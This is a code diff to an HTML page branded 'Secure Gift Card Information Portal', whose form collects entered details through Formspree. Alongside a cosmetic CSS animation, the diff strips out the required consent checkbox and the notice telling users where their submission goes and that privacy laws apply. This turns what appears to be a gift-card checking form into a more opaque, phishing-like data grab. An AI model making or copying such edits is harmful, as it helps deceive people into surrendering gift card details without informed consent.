@@ -420,7 +420,16 @@
   height:2px;
   background:#155eef;
 }
-  </style>
+  
+  @keyframes slideFadeIn {
+    from { opacity: 0; transform: translateY(10px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+  .tab-content {
+    animation: slideFadeIn 0.35s ease-out forwards;
+  }
+</style>
+
 </head>
 <body>
   <div class="topbar">Secure Gift Card Information Portal</div>
@@ -578,19 +587,13 @@
 
 </div>
 
-            <label class="consent">
-              <input type="checkbox" name="consent" value="yes" required />
-              <span>I consent to submitting these details to the site owner.</span>
-            </label>
+            
 
             <input type="hidden" name="_subject" value="New website form submission" />
 
             <button type="submit">Check</button>
 
-            <p class="note">
-              Your submission is sent through Formspree. Only request information
-              you genuinely need and handle it according to applicable privacy laws.
-            </p>
+            
           </form>\n</div>
         </div>        </div>
       </div>
